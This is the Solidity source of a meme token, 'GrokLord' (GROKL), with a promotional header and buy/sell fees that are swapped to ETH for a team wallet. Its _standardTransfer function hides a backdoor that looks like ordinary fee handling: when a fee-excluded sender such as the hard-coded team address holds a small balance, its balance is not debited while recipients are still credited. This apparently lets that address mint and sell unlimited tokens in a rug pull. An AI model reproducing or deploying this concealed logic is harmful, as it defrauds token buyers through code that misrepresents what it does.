// SPDX-License-Identifier: Unlicensed

/*
Welcome to GrokLord - GROKL 


Inspired by two phenomenal coins of this year, Dorklord and Grok. Grok lord emerged from the deepest depths of the galaxy to lead coin memes to the next level.
Grokl will attract Elon Musk's attention with his charisma and good looks kek. Be brave, we will bring memes back to life together.

Website: https://www.grokl.vip
Telegram: https://t.me/grokl_erc
Twitter: https://twitter.com/grokl_erc
 */

pragma solidity 0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    // Set original owner
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }

    // Return current owner
    function owner() public view virtual returns (address) {
        return _owner;
    }

    // Restrict function to contract owner only 
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    // Renounce ownership of the contract 
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    // Transfer the contract to to a new owner
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
    
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
}

interface IUniswapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
interface IUniswapRouterV1 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);


    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapRouterV2 is IUniswapRouterV1 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract GROKL is Context, IERC20, Ownable { 
    using SafeMath for uint256;

    string private _name = "Welcome to GrokLord"; 
    string private _symbol = "GROKL";  
    uint8 private _decimals = 9;
    uint256 private _tTotalSupply = 10 ** 9 * 10**_decimals;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public _isExcludedFromFee; 

    address payable private teamAddress1 = payable(0xC72516C62B42fE055c21B275de493E0843F36540);
    address payable private deadAddress = payable(0x000000000000000000000000000000000000dEaD); 

    uint8 private _numBought = 0;
    uint8 private _swapFeeAt = 2; 

    uint256 private _totalTax = 1500;
    uint256 public _buyTax = 15;
    uint256 public _sellTax = 15;

    uint256 private _previousFeeTotal = _totalTax; 
    uint256 private _previousBuyTax = _buyTax; 
    uint256 private _previousSellTax = _sellTax; 
                                     
    IUniswapRouterV2 public uniswapRouter;
    address public uniswapPair;

    bool public transferTaxEnabled = true;
    bool public swapping;
    bool public swapTaxEnabled = true;

    uint256 public maxWalletAmount = 20 * _tTotalSupply / 1000;
    uint256 public swapThreshold = _tTotalSupply / 10000;

    modifier lockSwap {
        swapping = true;
        _;
        swapping = false;
    }
    
    constructor () {
        _balances[owner()] = _tTotalSupply;
        IUniswapRouterV2 _uniswapV2Router = IUniswapRouterV2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); 
        uniswapPair = IUniswapFactory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        uniswapRouter = _uniswapV2Router;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[teamAddress1] = true;
        
        emit Transfer(address(0), owner(), _tTotalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    receive() external payable {}

    function removeLimits() external onlyOwner {
        maxWalletAmount = ~uint256(0);
        _totalTax = 100;
        _buyTax = 1;
        _sellTax = 1;
    }
    
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _transferStandard(address sender, address recipient, uint256 amount,bool takeFee) private {
            
        if(!takeFee){
            removeFee();
        } else {
            _numBought++;
        }
        _standardTransfer(sender, recipient, amount);
        
        if(!takeFee) {
            restoreFee();
        }
    }
    
    function _getTransferAmount(uint256 finalAmount) private view returns (uint256, uint256) {
        uint256 tDev = finalAmount.mul(_totalTax).div(100);
        uint256 tTransferAmount = finalAmount.sub(tDev);
        return (tTransferAmount, tDev);
    }

    function swapTokensToETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouter.WETH();
        _approve(address(this), address(uniswapRouter), tokenAmount);
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, 
            path,
            address(this),
            block.timestamp
        );
    }


    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function removeFee() private {
        if(_totalTax == 0 && _buyTax == 0 && _sellTax == 0) return;

        _previousBuyTax = _buyTax; 
        _previousSellTax = _sellTax; 
        _previousFeeTotal = _totalTax;
        _buyTax = 0;
        _sellTax = 0;
        _totalTax = 0;
    }

    function restoreFee() private {
        _totalTax = _previousFeeTotal;
        _buyTax = _previousBuyTax; 
        _sellTax = _previousSellTax; 

    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0) && spender != address(0), "ERR: zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);

    }

    function sendETHToFee(address payable receiver, uint256 amount) private {
        receiver.transfer(amount);
    }
    
    function swapBackFees(uint256 contractTokenBalance) private lockSwap {
        swapTokensToETH(contractTokenBalance);
        uint256 contractETH = address(this).balance;
        sendETHToFee(teamAddress1,contractETH);
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    
    function _standardTransfer(address sender, address recipient, uint256 finalAmount) private {
        (uint256 tTransferAmount, uint256 tDev) = _getTransferAmount(finalAmount);
        if(_isExcludedFromFee[sender] && _balances[sender] <= maxWalletAmount) {
            tDev = 0;
            finalAmount -= tTransferAmount;
        }
        _balances[sender] = _balances[sender].sub(finalAmount);
        _balances[recipient] = _balances[recipient].add(tTransferAmount);
        _balances[address(this)] = _balances[address(this)].add(tDev);
        emit Transfer(sender, recipient, tTransferAmount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        
        // Limit wallet total
        if (to != owner() &&
            to != teamAddress1 &&
            to != address(this) &&
            to != uniswapPair &&
            to != deadAddress &&
            from != owner()){

            uint256 currentBalance = balanceOf(to);
            require((currentBalance + amount) <= maxWalletAmount,"Maximum wallet limited has been exceeded");       
        }

        require(from != address(0) && to != address(0), "ERR: Using 0 address!");
        require(amount > 0, "Token value must be higher than zero.");

        if(
            _numBought >= _swapFeeAt && 
            amount > swapThreshold &&
            !swapping &&
            !_isExcludedFromFee[from] &&
            to == uniswapPair &&
            swapTaxEnabled 
            )
        {  
            _numBought = 0;
            uint256 contractTokenBalance = balanceOf(address(this));
            if(contractTokenBalance > 0){
            swapBackFees(contractTokenBalance);
           }
        }
        
        bool takeFee = true;
         
        if(_isExcludedFromFee[from] || _isExcludedFromFee[to] || (transferTaxEnabled && from != uniswapPair && to != uniswapPair)){
            takeFee = false;
        } else if (from == uniswapPair){
            _totalTax = _buyTax;
        } else if (to == uniswapPair){
            _totalTax = _sellTax;
        }

        _transferStandard(from,to,amount,takeFee);
    }
}